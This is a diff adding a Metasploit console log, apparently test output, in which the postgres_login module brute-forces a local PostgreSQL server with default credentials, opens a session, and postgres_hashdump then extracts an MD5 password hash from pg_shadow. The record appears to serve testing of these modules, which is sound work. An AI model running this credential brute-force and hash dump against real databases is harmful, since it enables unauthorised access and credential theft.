@@ -1,0 +1,34 @@
+use auxiliary/scanner/postgres/postgres_login
+Stopping all jobs...
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_login[0m) [0m> run PASS_FILE= USER_FILE= CreateSession=true username=postgres password=password rhost=127.0.0.1 rport=5432
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_login[0m) [0m> [!] No active DB -- Credential data will not be saved!
+[+] 127.0.0.1:5432 - Login Successful: postgres:password@template1
+[*] PostgreSQL session 4 opened (127.0.0.1:35391 -> 127.0.0.1:5432) at 2024-06-20 08:39:57 +0000
+use auxiliary/scanner/postgres/postgres_hashdump
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Bruteforce completed, 1 credential was successful.
+[*] 1 Postgres session was opened successfully.
+[*] Auxiliary module execution completed
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_login[0m) [0m> run session=4 Verbose=true
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> [*] 127.0.0.1:5432 Postgres - querying with 'SELECT usename, passwd FROM pg_shadow'
+[!] No active DB -- Credential data will not be saved!
+[+] Query appears to have run successfully
+[+] Postgres Server Hashes
+======================
+
+ Username  Hash
+ --------  ----
+ postgres  md532e12f215ba27cb750c9e093ce4b5127
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+sessions -K
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - PostgreSQL session 4 closed.
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> 
